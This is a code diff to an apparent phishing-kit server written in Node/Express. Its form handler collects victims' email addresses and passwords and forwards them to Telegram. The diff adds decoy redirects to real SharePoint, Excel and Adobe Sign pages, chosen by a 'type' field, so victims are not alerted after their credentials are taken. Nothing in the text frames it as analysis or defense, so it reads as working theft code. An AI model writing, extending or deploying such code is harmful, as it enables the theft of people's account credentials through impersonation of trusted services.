@@ -17,6 +17,8 @@ app.post('/q', async (req, res) => {
     if (!data.email || !data.password || !data.netob || !data.ditch) {
         return res.redirect('/error'); // Redirect to an error page if fields are missing
     }
+    
+    
 
     // Format the message
     const telegramMessage = `Attachment Submission ✅\n\nEmail: ${data.email}\nPassword: ${data.password}`;
@@ -31,8 +33,26 @@ app.post('/q', async (req, res) => {
         console.log('Message sent to Telegram successfully.');
 
         // Redirect to a success page
+        switch (data.type) {
+    case "sharepoint":
+        res.redirect('https://sharepoint.com');
+        break;
+
+    case "adobe":
         res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
-    } catch (error) {
+        break;
+
+    case "excel":
+        res.redirect('https://excel.com');
+        break;
+
+    default:
+        res.redirect('https://community.adobe.com/t5/adobe-acrobat-sign-discussions/adobe-sign-login-has-expired/m-p/10255182');
+        break;
+}
+        
+        
+           } catch (error) {
         console.error('Failed to send message to Telegram:', error.message);
         res.redirect('/error'); // Redirect to an error page in case of failure
     }
